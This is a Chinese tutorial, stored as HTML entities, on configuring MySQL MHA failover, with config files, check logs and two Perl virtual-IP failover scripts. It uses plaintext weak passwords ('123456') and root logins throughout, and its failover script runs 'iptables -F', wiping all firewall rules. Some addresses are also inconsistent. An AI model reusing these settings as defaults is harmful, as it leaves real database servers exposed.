//&#x8BBE;&#x7F6E;mysql&#x4E2D;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BC6;&#x7801;&#x662F;&#x524D;&#x6587;&#x4E2D;&#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#x7684;&#x90A3;&#x4E2A;&#x5BC6;&#x7801;user=root&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x7528;&#x6237;rootping_interval=1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x4E3B;&#x5E93;&#xFF0C;&#x53D1;&#x9001;ping&#x5305;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;3&#x79D2;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E09;&#x6B21;&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x7684;&#x65F6;&#x5019;&#x81EA;&#x52A8;&#x8FDB;&#x884C;railoverremote_workdir=/tmp&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x8FDC;&#x7AEF;mysql&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x65F6;binlog&#x7684;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;repl_password=123456&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;repl_user=repl&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x590D;&#x5236;&#x7528;&#x6237;&#x540D;report_script=/usr/local/send_report&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x53D1;&#x9001;&#x7684;&#x62A5;&#x8B66;&#x7684;&#x811A;&#x672C;shutdown_script=&quot;&quot;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x6545;&#x969C;&#x53D1;&#x751F;&#x540E;&#x5173;&#x95ED;&#x6545;&#x969C;&#x4E3B;&#x673A;&#x811A;&#x672C;&#xFF08;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x5173;&#x95ED;&#x4E3B;&#x673A;&#x653E;&#x5728;&#x53D1;&#x751F;&#x8111;&#x88C2;,&#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#xFF09;ssh_user=root&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;ssh&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D; [server1]hostname=192.168.10.12port=3306 [server2]hostname=192.168.10.13port=3306candidate_master=1&#xA0;&#xA0; #&#x8BBE;&#x7F6E;&#x4E3A;&#x5019;&#x9009;master&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x4EE5;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x4EE5;&#x540E;&#x5C06;&#x4F1A;&#x5C06;&#x6B64;&#x4ECE;&#x5E93;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF0C;&#x5373;&#x4F7F;&#x8FD9;&#x4E2A;&#x4E3B;&#x5E93;&#x4E0D;&#x662F;&#x96C6;&#x7FA4;&#x4E2D;&#x4E8B;&#x4EF6;&#x6700;&#x65B0;&#x7684;slavecheck_repl_delay=0&#xA0;&#xA0; #&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x5982;&#x679C;&#x4E00;&#x4E2A;slave&#x843D;&#x540E;master 100M&#x7684;relay logs&#x7684;&#x8BDD;&#xFF0C;MHA&#x5C06;&#x4E0D;&#x4F1A;&#x9009;&#x62E9;&#x8BE5;slave&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;slave&#x7684;&#x6062;&#x590D;&#x9700;&#x8981;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#xFF0C;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;check_repl_delay=0,MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x5728;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#x7684;&#x65F6;&#x5019;&#x5C06;&#x4F1A;&#x5FFD;&#x7565;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5BF9;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E86;candidate_master=1&#x7684;&#x4E3B;&#x673A;&#x975E;&#x5E38;&#x6709;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x5019;&#x9009;&#x4E3B;&#x5728;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E00;&#x5B9A;&#x662F;&#x65B0;&#x7684;master [server3]hostname=192.168.10.14port=3306 &#x53C2;&#x8003;&#x914D;&#x7F6E;&#xFF1A;1234567891011121314151617181920212223242526272829[server default]manager_workdir=/var/log/masterha/app1manager_log=/var/log/masterha/app1/manager.logmaster_binlog_dir=/var/lib/mysqlmaster_ip_failover_script= /usr/local/bin/master_ip_failovermaster_ip_online_change_script= /usr/local/bin/master_ip_online_change&#xA0;password=123456user=rootping_interval=1remote_workdir=/tmprepl_password=123456repl_user=slave#report_script=/usr/local/send_reportshutdown_script=&quot;&quot;ssh_user=root[server1]hostname=192.168.73.21port=3306[server2]hostname=192.168.73.22port=3306candidate_master=1check_repl_delay=0[server3]hostname=192.168.73.23port=3306 &#xFF08;2&#xFF09;&#x8BBE;&#x7F6E;relay log&#x7684;&#x6E05;&#x9664;&#x65B9;&#x5F0F;&#xFF08;&#x5728;&#x6BCF;&#x4E2A;slave&#x8282;&#x70B9;&#x4E0A;&#xFF09;&#xFF1A; 1234mysql&gt; set global relay_log_purge=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; &#x6CE8;&#x610F;&#xFF1A;MHA&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4ECE;&#x5E93;&#x7684;&#x6062;&#x590D;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F9D;&#x8D56;&#x4E8E;relay log&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8981;&#x5C06;relay log&#x7684;&#x81EA;&#x52A8;&#x6E05;&#x9664;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#xFF0C;&#x91C7;&#x7528;&#x624B;&#x52A8;&#x6E05;&#x695A;relay log&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;slave&#x4E0A;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4F1A;&#x5728;SQL&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x88AB;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x3002;&#x4F46;&#x662F;&#x5728;MHA&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x5728;&#x6062;&#x590D;&#x5176;&#x5B83;slave&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7528;&#x5230;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x7981;&#x7528;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x7684;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x529F;&#x80FD;&#x3002;&#x5B9A;&#x671F;&#x6E05;&#x695A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x9700;&#x8981;&#x8003;&#x8651;&#x5230;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x7684;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x4E25;&#x91CD;&#x7684;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6682;&#x65F6;&#x4E3A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x521B;&#x5EFA;&#x786C;&#x94FE;&#x63A5;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x901A;&#x8FC7;&#x786C;&#x94FE;&#x63A5;&#x5220;&#x9664;&#x5927;&#x6587;&#x4EF6;&#x901F;&#x5EA6;&#x4F1A;&#x5F88;&#x5FEB;&#x3002;&#xFF08;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x8868;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4E5F;&#x91C7;&#x7528;&#x5EFA;&#x7ACB;&#x786C;&#x94FE;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#xFF09; &#xFF08;3&#xFF09;.&#x68C0;&#x67E5;SSH&#x914D;&#x7F6E; &#x68C0;&#x67E5;MHA Manger&#x5230;&#x6240;&#x6709;MHA Node&#x7684;SSH&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#xFF1A; 12345678910111213141516171819202122[root@ctos7mini ~]&amp; masterha_check_ssh --conf=/etc/masterha/app1.cnfFri May 6 22:31:51 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May 6 22:31:51 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May 6 22:31:51 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May 6 22:31:51 2022 - [info] Starting SSH connection tests..Fri May 6 22:31:54 2022 - [debug]Fri May 6 22:31:51 2022 - [debug] Connecting via SSH from root@192.168.73.21(192.168.73.21:22) to root@192.168.73.22(192.168.73.22:22)..Fri May 6 22:31:52 2022 - [debug] ok.Fri May 6 22:31:52 2022 - [debug] Connecting via SSH from root@192.168.73.21(192.168.73.21:22) to root@192.168.73.23(192.168.73.23:22)..Fri May 6 22:31:53 2022 - [debug] ok.Fri May 6 22:31:55 2022 - [debug]Fri May 6 22:31:52 2022 - [debug] Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.21(192.168.73.21:22)..Fri May 6 22:31:53 2022 - [debug] ok.Fri May 6 22:31:53 2022 - [debug] Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.22(192.168.73.22:22)..Fri May 6 22:31:54 2022 - [debug] ok.Fri May 6 22:31:55 2022 - [debug]Fri May 6 22:31:52 2022 - [debug] Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.21(192.168.73.21:22)..Fri May 6 22:31:53 2022 - [debug] ok.Fri May 6 22:31:53 2022 - [debug] Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.23(192.168.73.23:22)..Fri May 6 22:31:54 2022 - [debug] ok.Fri May 6 22:31:55 2022 - [info] All SSH connection tests passed successfully.[root@ctos7mini ~]&amp; &#x5404;&#x4E2A;&#x8282;&#x70B9;ssh&#x9A8C;&#x8BC1;&#x90FD;&#x662F;ok&#x624D;&#x6B63;&#x5E38; &#xFF08;4&#xFF09;.&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x590D;&#x5236;&#x73AF;&#x5883;&#x72B6;&#x51B5; &#x914D;&#x7F6E;VIP123456789101112131415[root@ctos7mini ~]&amp; ifconfig ens33[root@rhel7 ~]&amp; ip -4 addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 inet 192.168.73.21/24 brd 192.168.73.255 scope global ens33 valid_lft forever preferred_lft forever[root@ctos7mini ~]&amp; ip addr add 192.168.73.73/24 brd 192.168.10.255 dev ens33 label ens33:1[root@ctos7mini ~]&amp; ip -4 addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 inet 192.168.73.20/24 brd 192.168.73.255 scope global ens33 valid_lft forever preferred_lft forever inet 192.168.73.73/24 brd 192.168.10.255 scope global secondary ens33:1 valid_lft forever preferred_lft forever[root@ctos7mini ~]&amp; &#x521B;&#x5EFA;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x811A;&#x672C;1[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_failover 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env perluse strict;use warnings FATAL =&gt; &apos;all&apos;;use Getopt::Long;my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port);my $vip = &apos;192.168.73.73&apos;;my $brdc = &apos;192.168.73.255&apos;;my $ifdev = &apos;ens33&apos;;my $key = &apos;1&apos;;my $ssh_start_vip = &quot;/usr/sbin/ip addr add $vip/24 brd $brdc dev $ifdev label $ifdev:$key;/usr/sbin/arping -q -A -c 1 -I $ifdev:$key $vip;iptables -F;&quot;;my $ssh_stop_vip = &quot;/usr/sbin/ip addr del $vip/24 dev $ifdev label $ifdev:$key&quot;;GetOptions( &apos;command=s&apos; =&gt; \\$command, &apos;ssh_user=s&apos; =&gt; \\$ssh_user, &apos;orig_master_host=s&apos; =&gt; \\$orig_master_host, &apos;orig_master_ip=s&apos; =&gt; \\$orig_master_ip, &apos;orig_master_port=i&apos; =&gt; \\$orig_master_port, &apos;new_master_host=s&apos; =&gt; \\$new_master_host, &apos;new_master_ip=s&apos; =&gt; \\$new_master_ip, &apos;new_master_port=i&apos; =&gt; \\$new_master_port,);exit &amp;main();sub main { print &quot;\\n\\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\\n\\n&quot;; if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) { my $exit_code = 1; eval { print &quot;Disabling the VIP on old master: $orig_master_host \\n&quot;; &amp;stop_vip(); $exit_code = 0; }; if ($@) { warn &quot;Got Error: $@\\n&quot;; exit $exit_code; } exit $exit_code; } elsif ( $command eq &quot;start&quot; ) { my $exit_code = 10; eval { print &quot;Enabling the VIP - $vip on the new master - $new_master_host \\n&quot;; &amp;start_vip(); $exit_code = 0; }; if ($@) { warn $@; exit $exit_code; } exit $exit_code; } elsif ( $command eq &quot;status&quot; ) { print &quot;Checking the Status of the script.. OK \\n&quot;; exit 0; } else { &amp;usage(); exit 1; }}sub start_vip() { `ssh $ssh_user\\@$new_master_host \\&quot; $ssh_start_vip \\&quot;`;}# A simple system call that disable the VIP on the old_mastersub stop_vip() { `ssh $ssh_user\\@$orig_master_host \\&quot; $ssh_stop_vip \\&quot;`;}sub usage { print &quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n&quot;;} 1[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_online_change 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/env perluse strict;use warnings FATAL =&gt;&apos;all&apos;;use Getopt::Long;#my $vip = &apos;172.25.0.100/24&apos;; # Virtual IPmy $vip = &apos;192.168.73.73/24&apos;; # Virtual IPmy $key = &quot;1&quot;;my $ssh_start_vip = &quot;/sbin/ifconfig ens33:$key $vip&quot;;my $ssh_stop_vip = &quot;/sbin/ifconfig ens33:$key down&quot;;my $exit_code = 0;my ( $command, $orig_master_is_new_slave, $orig_master_host, $orig_master_ip, $orig_master_port, $orig_master_user, $orig_master_password, $orig_master_ssh_user, $new_master_host, $new_master_ip, $new_master_port, $new_master_user, $new_master_password, $new_master_ssh_user,);GetOptions( &apos;command=s&apos; =&gt; \\$command, &apos;orig_master_is_new_slave&apos; =&gt; \\$orig_master_is_new_slave, &apos;orig_master_host=s&apos; =&gt; \\$orig_master_host, &apos;orig_master_ip=s&apos; =&gt; \\$orig_master_ip, &apos;orig_master_port=i&apos; =&gt; \\$orig_master_port, &apos;orig_master_user=s&apos; =&gt; \\$orig_master_user, &apos;orig_master_password=s&apos; =&gt; \\$orig_master_password, &apos;orig_master_ssh_user=s&apos; =&gt; \\$orig_master_ssh_user, &apos;new_master_host=s&apos; =&gt; \\$new_master_host, &apos;new_master_ip=s&apos; =&gt; \\$new_master_ip, &apos;new_master_port=i&apos; =&gt; \\$new_master_port, &apos;new_master_user=s&apos; =&gt; \\$new_master_user, &apos;new_master_password=s&apos; =&gt; \\$new_master_password, &apos;new_master_ssh_user=s&apos; =&gt; \\$new_master_ssh_user,);exit &amp;main();sub main {#print &quot;\\n\\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\\n\\n&quot;;if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) { # $orig_master_host, $orig_master_ip, $orig_master_port are passed. # If you manage master ip address at global catalog database, # invalidate orig_master_ip here. my $exit_code = 1; eval { print &quot;\\n\\n\\n***************************************************************\\n&quot;; print &quot;Disabling the VIP - $vip on old master: $orig_master_host\\n&quot;; print &quot;***************************************************************\\n\\n\\n\\n&quot;;&amp;stop_vip(); $exit_code = 0; }; if ($@) { warn &quot;Got Error: $@\\n&quot;; exit $exit_code; } exit $exit_code;}elsif ( $command eq &quot;start&quot; ) { # all arguments are passed. # If you manage master ip address at global catalog database, # activate new_master_ip here. # You can also grant write access (create user, set read_only=0, etc) here.my $exit_code = 10; eval { print &quot;\\n\\n\\n***************************************************************\\n&quot;; print &quot;Enabling the VIP - $vip on new master: $new_master_host \\n&quot;; print &quot;***************************************************************\\n\\n\\n\\n&quot;;&amp;start_vip(); $exit_code = 0; }; if ($@) { warn $@; exit $exit_code; } exit $exit_code;}elsif ( $command eq &quot;status&quot; ) { print &quot;Checking the Status of the script.. OK \\n&quot;; `ssh $orig_master_ssh_user\\@$orig_master_host \\&quot; $ssh_start_vip \\&quot;`; exit 0;}else {&amp;usage(); exit 1;}}# A simple system call that enable the VIP on the new mastersub start_vip() {`ssh $new_master_ssh_user\\@$new_master_host \\&quot; $ssh_start_vip \\&quot;`;}# A simple system call that disable the VIP on the old_mastersub stop_vip() {`ssh $orig_master_ssh_user\\@$orig_master_host \\&quot; $ssh_stop_vip \\&quot;`;}sub usage {print&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n&quot;;}[root@ctos7mini ~]# &#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6743;&#x9650;12345[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_failover[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_online_change[root@ctos7mini ~]&amp; grep /usr/local/bin/master_ip_failover /etc/masterha/app1.cnfmaster_ip_failover_script= /usr/local/bin/master_ip_failover[root@ctos7mini ~]&amp; &#x901A;&#x8FC7;masterha_check_repl&#x811A;&#x672C;&#x67E5;&#x770B;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x7684;&#x72B6;&#x6001; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879[root@ctos7mini ~]&amp; masterha_check_repl --conf=/etc/masterha/app1.cnfFri May 6 22:54:08 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May 6 22:54:08 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May 6 22:54:08 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May 6 22:54:08 2022 - [info] MHA::MasterMonitor version 0.54.Fri May 6 22:54:09 2022 - [info] Dead Servers:Fri May 6 22:54:09 2022 - [info] Alive Servers:Fri May 6 22:54:09 2022 - [info] 192.168.73.21(192.168.73.21:3306)Fri May 6 22:54:09 2022 - [info] 192.168.73.22(192.168.73.22:3306)Fri May 6 22:54:09 2022 - [info] 192.168.73.23(192.168.73.23:3306)Fri May 6 22:54:09 2022 - [info] Alive Slaves:Fri May 6 22:54:09 2022 - [info] 192.168.73.22(192.168.73.22:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May 6 22:54:09 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)Fri May 6 22:54:09 2022 - [info] Primary candidate for the new Master (candidate_master is set)Fri May 6 22:54:09 2022 - [info] 192.168.73.23(192.168.73.23:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May 6 22:54:09 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)Fri May 6 22:54:09 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Fri May 6 22:54:09 2022 - [info] Checking slave configurations..Fri May 6 22:54:09 2022 - [info] Checking replication filtering settings..Fri May 6 22:54:09 2022 - [info] binlog_do_db= ha, binlog_ignore_db= mysqlFri May 6 22:54:09 2022 - [info] Replication filtering check ok.Fri May 6 22:54:09 2022 - [info] Starting SSH connection tests..Fri May 6 22:54:12 2022 - [info] All SSH connection tests passed successfully.Fri May 6 22:54:12 2022 - [info] Checking MHA Node version..Fri May 6 22:54:14 2022 - [info] Version check ok.Fri May 6 22:54:14 2022 - [info] Checking SSH publickey authentication settings on the current master..Fri May 6 22:54:14 2022 - [info] HealthCheck: SSH to 192.168.73.21 is reachable.Fri May 6 22:54:15 2022 - [info] Master MHA Node version is 0.54.Fri May 6 22:54:15 2022 - [info] Checking recovery script configurations on the current master..Fri May 6 22:54:15 2022 - [info] Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/var/lib/mysql --output_file=/tmp/save_binary_logs_test --manager_version=0.54 --start_file=mysql-bin-master.000002Fri May 6 22:54:15 2022 - [info] Connecting to root@192.168.73.21(192.168.73.21).. Creating /tmp if not exists.. ok. Checking output directory is accessible or not.. ok. Binlog found at /var/lib/mysql, up to mysql-bin-master.000002Fri May 6 22:54:15 2022 - [info] Master setting check done.Fri May 6 22:54:15 2022 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..Fri May 6 22:54:15 2022 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.22 --slave_ip=192.168.73.22 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info --relay_dir=/var/lib/mysql/ --slave_pass=xxxFri May 6 22:54:15 2022 - [info] Connecting to root@192.168.73.22(192.168.73.22:22).. Checking slave recovery environment settings.. Opening /var/lib/mysql/relay-log.info ... ok. Relay log found at /var/lib/mysql, up to rhel_sqlsrv-relay-bin.000003 Temporary relay log file is /var/lib/mysql/rhel_sqlsrv-relay-bin.000003 Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Fri May 6 22:54:26 2022 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.23 --slave_ip=192.168.73.23 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info --relay_dir=/var/lib/mysql/ --slave_pass=xxxFri May 6 22:54:26 2022 - [info] Connecting to root@192.168.73.23(192.168.73.23:22).. Checking slave recovery environment settings.. Opening /var/lib/mysql/relay-log.info ... ok. Relay log found at /var/lib/mysql, up to ctos_sqlsrv-relay-bin.000011 Temporary relay log file is /var/lib/mysql/ctos_sqlsrv-relay-bin.000011 Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Fri May 6 22:54:37 2022 - [info] Slaves settings check done.Fri May 6 22:54:37 2022 - [info]192.168.73.21 (current master) +--192.168.73.22 +--192.168.73.23Fri May 6 22:54:37 2022 - [info] Checking replication health on 192.168.73.22..Fri May 6 22:54:37 2022 - [info] ok.Fri May 6 22:54:37 2022 - [info] Checking replication health on 192.168.73.23..Fri May 6 22:54:37 2022 - [info] ok.Fri May 6 22:54:37 2022 - [info] Checking master_ip_failover_script status:Fri May 6 22:54:37 2022 - [info] /usr/local/bin/master_ip_failover --command=status --ssh_user=root --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306IN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===Checking the Status of the script.. OKFri May 6 22:54:37 2022 - [info] OK.Fri May 6 22:54:37 2022 - [warning] shutdown_script is not defined.Fri May 6 22:54:37 2022 - [info] Got exit code 0 (Not master dead).MySQL Replication Health is OK. MySQL Replication Health is NOT OK! &#x5982;&#x679C;&#x63D0;&#x793A;&#x8FD9;&#x4E2A;&#x4E0D;OK&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x53C2;&#x8003;&#x6700;&#x540E;&#x7AE0;&#x8282;&#xFF09;MySQL Replication Health is OK.&#x663E;&#x793A;Ok &#xFF0C;&#x6B63;&#x5E38;&#xFF01; &#x53C2;&#x6570;&#x8C03;&#x8BD5;&#xFF1A;1234ln -s /usr/local/mysql57/bin/mysqlbinlog /usr/local/bin/mysqlbinlogln -s /usr/local/mysql57/bin/mysql /usr/local/bin/mysql[root@ctos7mini ~]&amp; grep master_ip_failover /etc/masterha/app1.cnf#master_ip_failover_script= /usr/local/bin/master_ip_failover &#xFF08;5&#xFF09;&#x68C0;&#x67E5;MHA Manager&#x7684;&#x72B6;&#x6001;&#xFF1A; &#x901A;&#x8FC7;master_check_status&#x811A;&#x672C;&#x67E5;&#x770B;Manager&#x7684;&#x72B6;&#x6001;&#xFF1A; 123[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnfapp1 is stopped(2:NOT_RUNNING).[root@ctos7mini ~]&amp; &#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x6B63;&#x5E38;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x201D;PING_OK&#x201D;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x663E;&#x793A;&#x201D;NOT_RUNNING&#x201D;&#xFF0C;&#x8FD9;&#x4EE3;&#x8868;MHA&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x5F00;&#x542F; &#xFF08;6&#xFF09;&#x5F00;&#x542F;MHA Manager&#x76D1;&#x63A7; nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp; &#x542F;&#x52A8;&#x53C2;&#x6570;&#x4ECB;&#x7ECD;&#xFF1A;123--remove_dead_master_conf&#xA0;&#xA0;&#xA0; &#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5F53;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x8001;&#x7684;&#x4E3B;&#x5E93;&#x7684;ip&#x5C06;&#x4F1A;&#x4ECE;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x79FB;&#x9664;--manger_log&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 